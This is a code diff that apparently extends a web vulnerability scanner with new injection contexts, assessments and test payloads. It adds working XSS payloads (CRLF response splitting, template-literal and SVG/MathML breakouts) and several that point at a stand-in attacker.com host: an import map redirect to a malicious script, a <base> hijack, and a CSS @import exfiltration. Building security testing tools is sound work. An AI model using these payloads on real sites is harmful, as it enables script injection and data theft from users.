@@ -36,6 +36,10 @@ function escapeMarkdown(s: string): string {
   return s.replace(/[`|\\]/g, c => `\\${c}`);
 }
 
+function hasClosingTagBreakout(chars: string[]): boolean {
+  return chars.some(c => /^<\/[a-z]+>$/i.test(c));
+}
+
 function generateAssessment(
   context: string,
   chars: string[],
@@ -46,6 +50,19 @@ function generateAssessment(
   const hasLt = chars.includes('<');
   const quote = chars.includes('"') ? '"' : "'";
 
+  if (canonical === CONTEXT.RESPONSE_SPLITTING) {
+    return "CRLF injection — full response splitting possible";
+  }
+  if (canonical === CONTEXT.JS_URI) {
+    return "JavaScript URI injection (direct XSS)";
+  }
+  if (canonical === CONTEXT.JS_TEMPLATE_LITERAL) {
+    if (chars.includes('$') && chars.includes('{')) {
+      return "Template literal expression hole injection (direct execution)";
+    }
+    if (chars.includes('`')) return "Template literal breakout via backtick";
+    return "JS template literal reflection";
+  }
   if (canonical === CONTEXT.JS_IN_QUOTE) {
     const parts: string[] = [];
     if (hasQuote) parts.push(`String breakout via \`${quote}\``);
@@ -61,6 +78,13 @@ function generateAssessment(
     if (chars.length > 0) return "Event handler injection";
     return "Event handler reflection, no chars confirmed";
   }
+  if (canonical === CONTEXT.IMPORT_MAP || canonical === CONTEXT.IMPORT_MAP_STRING) {
+    return "Import map injection — can redirect ES module imports";
+  }
+  if (canonical === CONTEXT.DATA_URI) {
+    if (chars.length > 0) return "Data URI injection in src/object/embed attribute";
+    return "Data URI reflection";
+  }
   if (canonical === CONTEXT.ATTRIBUTE_IN_QUOTE) {
     if (hasQuote) return `Attribute breakout via \`${quote}\``;
     return "Quoted attribute reflection, no quote breakout";
@@ -68,6 +92,28 @@ function generateAssessment(
   if (canonical === CONTEXT.ATTRIBUTE) {
     if (chars.includes(' ')) return "Unquoted attribute injection";
     return "Unquoted attribute reflection";
+  }
+  if (canonical === CONTEXT.DOM_CLOBBER) {
+    return "DOM clobbering potential via id/name attribute";
+  }
+  if (canonical === CONTEXT.RAWTEXT_ELEMENT) {
+    if (hasClosingTagBreakout(chars) && hasLt) {
+      const tag = chars.find(c => /^<\/[a-z]+>$/i.test(c)) ?? "</element>";
+      return `Element escape via \`${tag}\` + tag injection`;
+    }
+    return "RAWTEXT/RCDATA element reflection (requires closing tag escape)";
+  }
+  if (canonical === CONTEXT.SVG_CONTEXT) {
+    if (hasLt) return "SVG namespace reflection — SVG-specific event handlers available";
+    return "SVG namespace reflection";
+  }
+  if (canonical === CONTEXT.MATH_CONTEXT) {
+    if (hasLt) return "MathML namespace reflection — mutation XSS vectors available";
+    return "MathML namespace reflection";
+  }
+  if (canonical === CONTEXT.HTML_BASE_INJECTION) {
+    if (hasLt) return "`<base>` tag injection possible — can hijack relative script/form URLs";
+    return "Early HTML reflection before relative URLs";
   }
   if (canonical === CONTEXT.HTML) {
     if (hasLt) return "Tag injection possible";
@@ -77,6 +123,7 @@ function generateAssessment(
     return "HTML comment reflection";
   }
   if (canonical === CONTEXT.CSS || canonical === CONTEXT.CSS_IN_QUOTE) {
+    if (chars.includes('@')) return "CSS injection with @-rule support (data exfiltration via @import)";
     return "Style injection";
   }
   if (canonical === CONTEXT.JSON_STRUCTURE) {
@@ -110,6 +157,18 @@ function generateTestPayload(
   const hasLt = chars.includes('<');
   const quote = chars.includes('"') ? '"' : "'";
 
+  if (canonical === CONTEXT.RESPONSE_SPLITTING) {
+    return `%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>`;
+  }
+  if (canonical === CONTEXT.JS_URI) {
+    return `alert(1)//`;
+  }
+  if (canonical === CONTEXT.JS_TEMPLATE_LITERAL) {
+    if (chars.includes('$') && chars.includes('{')) return `\${alert(1)}`;
+    if (chars.includes('`') && hasLt) return `\`</script><svg onload=alert(1)>`;
+    if (chars.includes('`')) return `\`-alert(1)-\``;
+    return undefined;
+  }
   if (canonical === CONTEXT.JS_IN_QUOTE) {
     if (hasQuote && hasLt) {
       return `${quote}</script><svg onload=alert(1)>`;
@@ -126,6 +185,12 @@ function generateTestPayload(
     if (chars.length > 0) return `)-alert(1)-(`;
     return undefined;
   }
+  if (canonical === CONTEXT.IMPORT_MAP || canonical === CONTEXT.IMPORT_MAP_STRING) {
+    return `https://attacker.com/malicious.js`;
+  }
+  if (canonical === CONTEXT.DATA_URI) {
+    return `data:text/html,<script>alert(1)</script>`;
+  }
   if (canonical === CONTEXT.ATTRIBUTE_IN_QUOTE) {
     if (hasQuote) {
       return `${quote} onfocus=alert(1) autofocus=${quote}`;
@@ -136,8 +201,31 @@ function generateTestPayload(
     if (chars.includes(' ')) return `x onfocus=alert(1) autofocus`;
     return undefined;
   }
+  if (canonical === CONTEXT.RAWTEXT_ELEMENT) {
+    const closingTag = chars.find(c => /^<\/[a-z]+>$/i.test(c));
+    if (closingTag && hasLt) {
+      return `${closingTag}<img src=x onerror=alert(1)>`;
+    }
+    return undefined;
+  }
+  if (canonical === CONTEXT.SVG_CONTEXT) {
+    if (hasLt) return `<animate onbegin=alert(1)>`;
+    return undefined;
+  }
+  if (canonical === CONTEXT.MATH_CONTEXT) {
+    if (hasLt) return `</math><img src=x onerror=alert(1)>`;
+    return undefined;
+  }
+  if (canonical === CONTEXT.HTML_BASE_INJECTION) {
+    if (hasLt) return `<base href="https://attacker.com/">`;
+    return undefined;
+  }
   if (canonical === CONTEXT.HTML) {
     if (hasLt) return `<img src=x onerror=alert(1)>`;
+    return undefined;
+  }
+  if (canonical === CONTEXT.CSS || canonical === CONTEXT.CSS_IN_QUOTE) {
+    if (chars.includes('@')) return `@import url(https://attacker.com/exfil.css)`;
     return undefined;
   }
   if (canonical === CONTEXT.RESPONSE_HEADER || headers?.length) {
